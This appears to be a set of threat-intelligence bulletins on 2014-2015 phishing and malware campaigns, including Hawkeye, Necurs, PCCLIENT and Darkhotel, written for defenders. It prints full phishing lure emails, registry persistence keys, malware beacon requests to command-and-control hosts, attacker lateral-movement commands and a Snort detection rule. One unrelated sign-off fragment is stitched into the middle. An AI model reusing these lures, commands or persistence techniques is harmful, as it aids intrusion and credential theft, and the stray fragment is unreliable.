t=1426164255;bh=Y0vz2dSmkTB7bQP4shY0wkhxXr0Din4vMdA/+UnR65o=;h=From:To:Subject:Message-Id:Date:MIME-Version:Content-Type;b=p2ZAT3Ad/H6qHHirttBq2awI94nJcND2SezMCdnmEvB/WXCoStjMjmdYezWEU2SgF0sg6c7xeDBy1Hw8Dd4yhlwgNtLSkSR+As0nonaibFuQVdl8pF3Rq2K7FWVfGqY1CGvCLha9DHLCEqubpefE9xWAlxQi2g/1T4Zilqx2FHg= x-aol-sid: 3039ac1afeaf55018a1e2216 ----- END EMAIL HEADER -----
----- BEGIN EMAIL BODY ----- From: tavan_tolgoi@aol.com To: [REDACTED] CC: [REDACTED] Date: Thu Mar 12 12:44:14 GMT 2015 Subject: Tavantolgoin Medee No1 (20150305) Attachment: Tavantolgoin Medee No1 (20150305).doc
Tavantolgoin Medeeg huleen avna uu. Jich: Havsraltaar yavuulav.
----- END EMAILBODY -----

The attachment file hides itself in the user's temp system registry: HKEY_USERS\S-1-5-21-1454471165-1644491937-839522115-1003\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs= rundll32.exe C:\DOCUME~1\[USER]\LOCALS~1\Temp\xpsfiltsvcs.tmp,XpsRegisterServer

This file is a trojan backdoor that disguised as an XPS file. This is a DLL file executed from the registry run key entry. After logging in and a brief sleep period, the malware calls out to here.pechooin.com:8080.

The backdoor xpsfiltsvcs.tmp (cc8da150a031d8200bb62289ab35bc1d) sent an HTTP POST request to here.pechooin.com.
POST /cgl-bin/update.cgi HTTP/1.1 Host: here.pechooin.com:8080 Content-Length: 25 Cache-Control: no-cache
ptu..tzzt..oouddtputws*xx
00000000 50 4f 53 54 20 2f 63 67 6c 2d 62 69 6e 2f 75 70 POST /cg l-bin/up 00000010 64 61 74 65 2e 63 67 69 20 48 54 54 50 2f 31 2e date.cgi HTTP/1. 00000020 31 0d 0a 48 6f 73 74 3a 20 68 65 72 65 2e 70 65 1..Host: here.pe 00000030 63 68 6f 6f 69 6e 2e 63 6f 6d 3a 38 30 38 30 0d chooin.c om:8080. 00000040 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a .Content -Length: 00000050 20 32 35 0d 0a 43 61 63 68 65 2d 43 6f 6e 74 72 25..Cac he-Contr 00000060 6f 6c 3a 20 6e 6f 2d 63 61 63 68 65 0d 0a 0d 0a ol: no-c ache.... 00000070 70 74 75 05 05 74 7a 7a 74 18 18 6f 6f 75 64 64 ptu..tzz t..ooudd 00000080 74 70 75 74 77 73 2a 78 78 tputws*x x
These three domains resolved to IP address 137.175.36.13 here.pechooin.com keep.regebky.com love.regebky.com
The domain keep.regebky.com has been reported previously in a similar spear phishing campaign described in IB-15-10033.

stix:STIX_Header.stix:Title: Hawkeye Keylogger Observed in Transferred Copy Themed Emails
stix:STIX_Header.stix:Description: On 27 January 2015, a financial sector company observed a phishing campaign using Transferred Copy themed emails. The observed email contained a .rar attachment that claims to confirm a payment. When opened, it executes a Hawkeye Keylogger executable. It was reported that the keylogger in this specific email campaign attempts to communicate with IP address 192.99.212.64.

stix:Indicator.indicator:Description:
The attached malicious file, the Hawkeye Keylogger, has been widely reported. The files will vary widely as they are likely to be adapted to avoid detection.
----- BEGIN EMAIL BODY ----- Dear,
Please find attached TT copy of payment made to your account today,
Thank you ----- END EMAIL BODY -----

Once the Hawkeye Keylogger is executed it calls back to IP address: 192.99.212.64. This IP address was reported as the command and control (C2) for the observed instance of the Hawkeye Keylogger.
----- BEGIN DOMAIN WHOIS ----- Domain Whois record for: 192.99.212.64
Queried whois.internic.net with "dom ip-192-99-212.net"...
Domain Name: IP-192-99-212.NET Registrar: OVH Sponsoring Registrar IANA ID: 433 Whois Server: whois.ovh.com Referral URL: http://www.ovh.com Name Server: DNS10.OVH.CA Name Server: NS10.OVH.CA Status: clientDeleteProhibited http://www.icann.org/epp#clientDeleteProhibited Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited Updated Date: 14-may-2014 Creation Date: 14-may-2014 Expiration Date: 14-may-2015 ----- END DOMAIN WHOIS -----

stix:STIX_Header.stix:Title: Purchase Order Themed Phishing Email Attachment Identified as Sohanad.B Worm
stix:STIX_Header.stix:Description: On 26 January 2015, a third party reported two phishing emails that contained malware, sent from an envelope address of info@msc.com. The emails used a Purchase Order theme. The attached file kIq5pa5.exe (MD5 1dc1f1682f2a95c351435a7f867535d0) was identified as the sohanad.b worm.

stix:Indicator.indicator:Description: No email headers or body were provided.

This file is associated with the sohanad.b worm. It was reported that the malware installs itself to the C:\Windows\System32\Microsoft\ directory under generic file names, such as svhost32.exe and rvhost.exe. The malware is capable of disabling processes such as antivirus, Windows Task Manager and Registry Editor. Like many malware programs, the Sohanad.b worm can also load additional malware. Sohanad.b worm is coded with the AutoIt scripting language and possesses the ability to self-replicate through its use of AutoRun registry entries.

stix:STIX_Header.stix:Title: PCCLIENT Malware Installed After Web Shell Compromise
stix:STIX_Header.stix:Description: On 17 December 2014, the malware known as PCCLIENT (or PHOTO) was observed on a network of a U.S. Government Department. The malware 64.dll (MD5: F233CF592FF62DA22D71263D5ECCCB39) called back to http://14.206.231.13:443/Query.asp.

stix:Indicator.indicator:Description:
PE Compile Time: 2014-11-12 11:40:00
The file 64.dll is the DoorDLL implant. This malware is also known as PCCLIENT or PHOTO.
On 17 December 2014, attackers established an interactive session to compromise a system on a U.S. Government network using a China Chopper web shell backdoor in the directory "C:\Inetpub\[REDACTED] Domain 1\group\" and the file flashobject.aspx. Through the web shell, attackers issued systems level commands to run on a second compromised host. Operating out of the directory on the first host, the attackers performed directory listings of multiple folders and shared drives on the second host including: C$ C$\windows\tasks C$\windows\system
The attackers then successfully scheduled the task 2XDevRedir to run through the command "schtasks /s Host # 2 /run /tn2XDevRedir /u [User Account #1] /p [password]".
The attacker then searched several folders on the second host's "admin$\system32\" directory for files beginning with the letters "wmi". The search found a file named 'WmiSrvSE.exe' with a last modified date of 11/19/2014 07:58 PM with a file size of 236,544 bytes. The attacker then deleted this file.
Operating out of the "C:\Inetpub\[REDACTED] Domain 1\group\" directory on the first host, the attacker then uploaded the file 64.dll on 12/17/2014 02:28 AM to the directory "C:\ProgramData\" on the first host and confirmed it was successfully transferred.
The attacker performed the command "net use" to confirm access to the second host's network shared drives. The file 64.dll was then copied into the directory "C:\Windows\temp" on the second host and then scheduled to run via the command "at \\host#2 04:28 regsvr32.exe c:\windows\temp\64.dll".
According to the report, it was unclear if 64.dll was executed on the victim host. These attackers have maintained a presence on the compromised network for several months and likely obtained legitimate credentials for continued access. These attackers previously used the HiKit A malware to maintain access into the network. According to the report they use a variety of tools to compromise systems. They will likely install multiple backdoors on multiple hosts for redundancy and to maintain persistence.
The implant called back by using unencrypted HTTP GET requests over TCP port 443 to the IP address 14.206.231.13 registered in South Korea.

The following GET request was sent by the malware:
GET /Query.asp?loginid=112037 HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Host: 14.206.231.13:443 Cache-Control: no-cache Pragma: no-cache Connection: Keep-Alive
A Snort signature was written to potentially detect this DoorDLL network traffic:
alert tcp any any -> any 443 (msg:"DoorDLL Beacon To Server"; flow:to_server,established; content:"GET"; content:"Query.asp?loginid="; sid:1; rev:1;)

stix:STIX_Header.stix:Title: Necurs Malware and C2 Identified from Financial Sector Incident
stix:STIX_Header.stix:Description: On 27 August 2014, the Necurs malware (MD5: 0adc60d78faf35c8bd044ff562e6168a) was observed in an incident against a financial organization. The malware beacons to IP 128.199.176.195 every minute.

stix:Indicator.indicator:Description:
According to the data source, the Necurs malware includes the following capabilities:
- VM Aware - Anti-debugger - Hooks in SSDT - Unloads common analysis tool drivers - Monitors registry activity - Can download additional malware
This file creates the following registry key to enable persistence: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\service\syshost32: C:\Windows\Installer\{GUID}\syshost.exe /service
The file copies itself to: C:\windows\installer\{GUID}\syshost.exe
It creates a service: C:\windows\installer\{GUID}\syshost.exe /service

After successful check-in over UDP, the Necurs malware communicates with the received IP over http and sends a HTTP POST request to http://128.199.176.195/forum/db.php. It communicates with the server every minute.
The Necurs malware alters the local firewall rules table with netsh.exe. It also queries a domain generation algorithm (DGA) domain list and communicates via UDP over ports 10000-30000.

stix:STIX_Header.stix:Title: Phishing Email with Payment Confirmation Theme Contains Malicious Attachment
stix:STIX_Header.stix:Description: On 16 February 2015, a malicious email campaign targeted a numerous email recipients. Multiple emails were sent from 75 unique sender addresses using the subject "Payment confirmation - credit card charged" and included the malicious word document, sf_trans_7891048.doc (MD5: cf9443e43b990077a3862aa4f9337fb2). All the emails had the same spoofed sender address from no-reply@salesforce.com. If executed successfully, a Trojan downloader sends an HTTP GET request to IP address 91.220.131.28 to download 2nd stage malware.

stix:Indicator.indicator:Description:
Each email had an identical attachment, body and User-Agent string: Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Thunderbird/24.2.0 MIME-Version: 1.0
----BEGIN EMAIL HEADER---- From - Mon Feb 16 16:19:57 2015 <neophytesn4@reefnet.com> Message-ID: <OBTPNE9V.2075090@reefnet.com> Date: Mon, 16 Feb 2015 16:22:00 +0100 From: "Salesforce.com" <no-reply@salesforce.com> User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Thunderbird/24.2.0 MIME-Version: 1.0 To: [REDACTED] Subject: Payment confirmation - credit card charged Content-Type: multipart/mixed; boundary="------------000309040904030408050909"
This is a multi-part message in MIME format. --------------000309040904030408050909 Content-Type: text/plain; charset=ISO-8859-1; format=flowed Content-Transfer-Encoding: 7bit ----END EMAIL HEADER----
----BEGIN EMAIL BODY----
Dear user,
Thank you for purchasing Salesforce Performance Plus plan. This message is a confirmation that your credit card has been charged.
Service : Salesforce Performance Plus Date : 16/2/2015 Amount : 1600 USD Transaction # : 7891048
For more information regarding this payment, please check the attached merchant receipt.
Note: This payment will appear on your statement as "SalesForce AUTH #7891048"
Thank you.
----END EMAIL BODY----

This is a malicious attachment disguised as a Microsoft Word document. When the attachment is opened three scripts are created:
adobeacd-update.ps1 (MD5:b9f62a25a55bca25345f285cca8342ae) adobeacd-update.vbs (MD5:969e1c8517cc2b734a1094aef45af8cd) adobeacd-update.bat (MD5:2b865123c5d736f3ea8a016ec51e5de3)
These files obfuscate themselves in temp files. They create copies of themselves, and then are deleted. The malware sends HTTP GET requests to IP Address: 91.220.131.28 over Port 80, to download second stage malware.
This file is a PowerShell script that is created when the malicious attachment is opened.
This is a Visual Basic Script file that is created when the malicious attachment is opened.
This is a batch script file that is created when the malicious attachment is opened.
Once the malicious attachment is executed it sends an HTTP GET request to IP address 91.220.131.28 and downloads this file.
An HTTP GET request is sent to this location and is used to download second stage malware.

stix:STIX_Header.stix:Title: Emails with Various Email Subjects Contain Malicious Links
stix:STIX_Header.stix:Description:
On 17 September 2014, malicious emails were sent from many senders with various subject lines to 239 recipients of a defense industrial base (DIB) organization. The emails contained a malicious link to www.southernexhibits.com. The message displays an html page with a reference to www.bankofamerica.com.
The source tracks this activity under the name Clandestine Fox. This is related to previous activity described in IB-14-10446.

Thanks once again & have yourselves a wonderful September !

[REDACTED]

Mental Health Drop-In Centre

stix:STIX_Header.stix:Title: Phishing Email with Photos Theme Associated with Darkhotel Activity
stix:STIX_Header.stix:Description: On 22 January 2015, an aviation industry organization received a phishing email from james.wright24@mail.com. The email included the subject "photos from our last meeting" and a malicious link to photo.storyonboard.net (204.14.121.60). This phishing campaign was associated with Darkhotel activity.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- Return-Path: <james.wright24@mail.com> Received: from REDACTED Wed, 21 Jan 2015 21:37:17 -0800 X-Sieve: CMU Sieve 2.3 Received: from [REDACTED] by [REDACTED] (version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=FAIL) for [REDACTED]; Wed, 21 Jan 2015 21:37:17 -0800 Received: from localhost (localhost [127.0.0.1]) by [REDACTED] with SMTP id t0M5bGYj011782; Wed, 21 Jan 2015 21:37:16 -0800 Received: from mout.gmx.com (mout.gmx.com [74.208.4.200]) by [REDACTED] (version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO) for [REDACTED]; Wed, 21 Jan 2015 21:36:58 -0800 Received: from [140.113.110.11] by 3capp-mailcom-lxa10.server.lan (via HTTP); Thu, 22 Jan 2015 06:36:56 +0100 MIME-Version: 1.0 Message-ID: <trinity-8e9527b7-597c-499d-b390-629b9e92b368-1421905015659@3capp-mailcom-lxa10> From: [REDACTED] <james.wright24@mail.com> To: REDACTED Subject: photos from our last meeting Content-Type: text/html; charset=UTF-8 Date: Thu, 22 Jan 2015 06:36:56 +0100 Importance: normal Sensitivity: Normal X-Priority: 3 X-Provags-ID: V03:K0: X-UI-Out-Filterresults: notjunk:1; X-TM-AS-MML: disable X-TM-AS-ERS: 74.208.4.200-127.9.0.1 X-TM-AS-Product-Ver: IMSS-7.1.0.1597-7.5.0.1017-21272.003 X-TM-AS-Result: No--3.766-4.5-31-10 X-imss-scan-details: No--3.766-4.5-31-10;No--3.766-5.0-31-10;No--3.766-10.0-31-10 X-TM-AS-Result-Xfilter: Match text exemption rules:No;Match text exemption rules:No X-TMASE-MatchedRID:  X-imss-reprocess-rules: 282.121 X-imss-reprocess-type: readdress X-TM-AS-URLRatingInfo: 71-93-=?utf-8?B?aHR0cDovL3Bob3RvLnN0b3J5b25ib2FyZC5uZXQvcGhvdG92aWV3ZXIuaHRh?= X-TM-AS-URLRatingAct: 80-handoff:xheader X-CustomCatchHeader: noloop ---- END EMAIL HEADER ----
---- BEGIN EMAIL BODY ---- I send your photos from last meeting. I know we took pictures several months ago, but I'm deeply sorry that I'm now sending photos. Please check your photos, and if you have any queries, give me a reply.
You can download photos on the link below. Download photos <http://photo.storyonboard.net/photoviewer.hta>
Thank you. http://photo.storyonboard.net/readme.php?id=b10&type=0 ---- END EMAIL BODY ----
This link was embedded into the original email.
This file was reported as an unknown file type. This is the file that was downloaded from the reported URL (http://photo.storyonboard.net/photoviewer.hta).

The following GET request was observed:
GET /readme.php?type=creation&result=created&info=0 HTTP/1.1 Accept: */* Accept-Language: en-us Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022) Host: photo.storyonboard.net Connection: Keep-Alive
The domain photo.storyboard.net resolved to IP 204.14.121.60. On 26 September 2014, a third party associated IP 204.14.121.60 with campaigns using the Tapaoux malware.
